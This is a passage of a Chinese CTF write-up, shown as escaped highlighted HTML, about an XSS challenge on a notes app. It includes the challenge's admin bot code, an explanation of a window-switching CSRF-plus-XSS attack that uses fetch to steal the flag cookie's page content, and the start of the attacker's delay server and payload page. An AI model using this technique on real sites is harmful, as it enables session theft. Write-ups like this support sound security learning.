&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;/head&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;body&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;h3&amp;gt;&amp;lt;a href=&amp;#34;/note&amp;#34;&amp;gt;Get Note&amp;lt;/a&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;a href=&amp;#34;/&amp;#34;&amp;gt;Change Note&amp;lt;/a&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;a href=&amp;#34;/report&amp;#34;&amp;gt;Report Link&amp;lt;/a&amp;gt;&amp;lt;/h3&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;hr&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;h3&amp;gt;Please report suspicious URLs to admin&amp;lt;/h3&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;form action=&amp;#34;/do_report&amp;#34; id=&amp;#34;reportform&amp;#34; method=POST&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> URL: &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;url&amp;#34; placeholder=&amp;#34;URL&amp;#34;&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;submit&amp;#34;&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;/form&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;/body&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 首页&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;head&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;title&amp;gt;Notes app&amp;lt;/title&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;/head&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;body&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;h3&amp;gt;&amp;lt;a href=&amp;#34;/note&amp;#34;&amp;gt;Get Note&amp;lt;/a&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;a href=&amp;#34;/&amp;#34;&amp;gt;Change Note&amp;lt;/a&amp;gt;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;a href=&amp;#34;/report&amp;#34;&amp;gt;Report Link&amp;lt;/a&amp;gt;&amp;lt;/h3&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;hr&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;h3&amp;gt; Add a note &amp;lt;/h3&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;form action=&amp;#34;/change_note&amp;#34; id=&amp;#34;noteform&amp;#34; method=POST&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;textarea rows=&amp;#34;10&amp;#34; cols=&amp;#34;100&amp;#34; name=&amp;#34;data&amp;#34; form=&amp;#34;noteform&amp;#34; placeholder=&amp;#34;Note&amp;#39;s content&amp;#34;&amp;gt;&amp;lt;/textarea&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;submit&amp;#34;&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;/form&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;lt;br&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;lt;/body&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>下面是bot.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">redis&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;redis&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">redis&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createClient&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">6379&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// replace with your port
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;redis&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// replace with your hostanme or IP address
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">puppeteer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;puppeteer&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">browse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`Browsing -&amp;gt; &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">browser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">puppeteer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">launch&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">headless&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">args&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;--no-sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;--disable-gpu&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})).&lt;/span>&lt;span style="color:#75af00">createIncognitoBrowserContext&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// 无头模式
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">newPage&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setCookie&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CHALL_COOKIE&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">domain&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CHALL_HOST&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sameSite&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Lax&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// samesite cookie lax 警惕
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">secure&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 访问url
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">waitUntil&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;load&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`Done visiting -&amp;gt; &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">blpop&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#39;submissions&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">submit_url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">submit_url&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">// 取出redis中提交的url
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 处理url
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;XSS Bot ready&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>flag在admin bot的cookie中，它会带着这个session访问我们的页面，如果它直接访问/note那么它本地的页面上就会有flag，但是我们无法获得&lt;/p>
&lt;p>注意到特殊的请求头&lt;code>X-Frame-Options=DENY&lt;/code>，它使得该页面不允许被任何页面引用，也不允许引用任何页面，所以没法用&lt;code>iframe&lt;/code>相关的技巧来做：发送给admin的页面(on our host)上共有两个iframe，第一个src指向/flag(可以看到flag的页面)的iframe，第二个iframe有我们的xss payload，这个payload中的script脚本可以做到XFS - cross frame scripting(读取top.frames)来到达原有的页面，转向页面的第一个iframe读到flag并取出，利用的是两个iframe是同源的，所以可以see each other&amp;rsquo;s content&lt;/p>
&lt;p>所以我们想到用window而不是iframe来达到相似的效果（原理一致）：发送给admin的页面(on our host)上有script可以在新窗口打开/note页面(含有flag)，然后script用csrf的方式post xss payload(设置&lt;code>target=&amp;quot;_blank&amp;quot;&lt;/code>使其在新窗口出现)，在post完成之后将当前窗口转为之前的/note 来使post的xss执行，由于同源可以获得含flag的/note页面的内容，再fetch外带flag&lt;/p>
&lt;p>思路跟iframe的是一样的，只不过由切换iframe变为切换Tab window，接下来尝试写payload&lt;/p>
&lt;p>注意以下xss bot，由于它的&lt;code>watiUntil&lt;/code>的设置，一旦被认为是加载就会直接die掉，这里的绕过方式是用中转页面手动延时让其挂起（&lt;code>setTimeout&lt;/code>则起不到同样的效果&lt;/p>
&lt;p>payload-url&lt;/p>
&lt;pre tabindex="0">&lt;code>http://xxxx/pb
&lt;/code>&lt;/pre>&lt;p>app.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/pb&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/pb.html&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/delayThen404&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(()=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendStatus&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">404&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">5050&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Local server running on port: &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>/pb.html&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>hello world&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://tbdxss.chal.perfect.blue/change_note&amp;#34;&lt;/span> &lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;noteform&amp;#34;&lt;/span> &lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">POST&lt;/span> &lt;span style="color:#75af00">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;_blank&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
